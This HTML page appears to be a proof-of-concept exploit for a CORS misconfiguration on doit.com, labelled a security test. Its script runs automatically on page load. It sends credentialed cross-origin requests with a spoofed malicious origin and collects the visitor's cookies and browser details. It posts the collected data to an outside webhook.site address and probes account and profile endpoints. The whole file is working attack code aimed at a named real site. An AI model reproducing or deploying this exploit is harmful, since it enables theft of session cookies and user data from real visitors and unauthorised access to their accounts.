<!DOCTYPE html>
<html>
<head>
    <title>Security Test Page</title>
</head>
<body>
    <h2>DoiT CORS Vulnerability Exploitation Proof</h2>
    <div id="results" style="background:#f0f0f0; padding:20px; margin:20px;"></div>

    <script>
        async function exploitCORS() {
            const results = document.getElementById('results');
            let log = '<h3>üîç CORS Exploitation Attempt</h3>';
            
            try {
                // Step 1: Test basic CORS access
                log += '<p><strong>Step 1:</strong> Testing CORS access to DoiT...</p>';
                
                const response = await fetch('https://www.doit.com/cdn-cgi/rum?', {
                    method: 'POST',
                    credentials: 'include',  // Critical - sends cookies
                    headers: {
                        'Content-Type': 'application/json',
                        'Origin': 'https://malicious-domain.com'
                    },
                    body: JSON.stringify({
                        exploit: true,
                        timestamp: new Date().toISOString(),
                        victimInfo: {
                            userAgent: navigator.userAgent,
                            language: navigator.language,
                            cookies: document.cookie,
                            referrer: document.referrer,
                            url: window.location.href
                        }
                    })
                });

                // Step 2: Analyze response
                log += `<p><strong>Step 2:</strong> CORS Request Successful!</p>`;
                log += `<p>Status: ${response.status}</p>`;
                log += `<p>Headers: <pre>${JSON.stringify(Object.fromEntries([...response.headers]), null, 2)}</pre></p>`;
                
                // Step 3: Exfiltrate data to webhook
                log += `<p><strong>Step 3:</strong> Exfiltrating stolen data...</p>`;
                
                const exfilData = {
                    vulnerability: 'CORS Misconfiguration - DoiT',
                    impact: 'Credentials and user data access',
                    proof: {
                        corsRequest: {
                            status: response.status,
                            headers: Object.fromEntries([...response.headers]),
                            credentials: 'include worked'
                        },
                        victimData: {
                            userAgent: navigator.userAgent,
                            language: navigator.language,
                            cookies: document.cookie,
                            platform: navigator.platform,
                            screen: `${screen.width}x${screen.height}`,
                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                            timestamp: new Date().toISOString()
                        },
                        exploitation: {
                            originUsed: 'https://malicious-domain.com',
                            endpoint: 'https://www.doit.com/cdn-cgi/rum?',
                            method: 'POST with credentials'
                        }
                    }
                };

                // Send to webhook
                const exfilResponse = await fetch('https://webhook.site/cb817682-9189-4ff5-9ad2-781a552cbd85', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(exfilData)
                });

                log += `<p><strong>‚úÖ Exploitation Successful!</strong></p>`;
                log += `<p>Data exfiltrated to webhook.site</p>`;
                log += `<p>Webhook Response: ${exfilResponse.status}</p>`;
                
                // Step 4: Demonstrate additional impact
                log += `<p><strong>Step 4:</strong> Testing additional endpoints...</p>`;
                
                // Test if other endpoints are accessible
                const endpoints = [
                    '/api/user',
                    '/account',
                    '/profile'
                ];
                
                for (const endpoint of endpoints) {
                    try {
                        const testResponse = await fetch(`https://www.doit.com${endpoint}`, {
                            method: 'GET',
                            credentials: 'include',
                            headers: {'Origin': 'https://malicious-domain.com'}
                        });
                        log += `<p>Endpoint ${endpoint}: Status ${testResponse.status}</p>`;
                    } catch (e) {
                        log += `<p>Endpoint ${endpoint}: Blocked</p>`;
                    }
                }

            } catch (error) {
                log += `<p><strong>‚ùå Exploitation Failed:</strong> ${error.message}</p>`;
            }

            results.innerHTML = log;
        }

        // Run the exploit when page loads
        exploitCORS();
    </script>
</body>
</html>
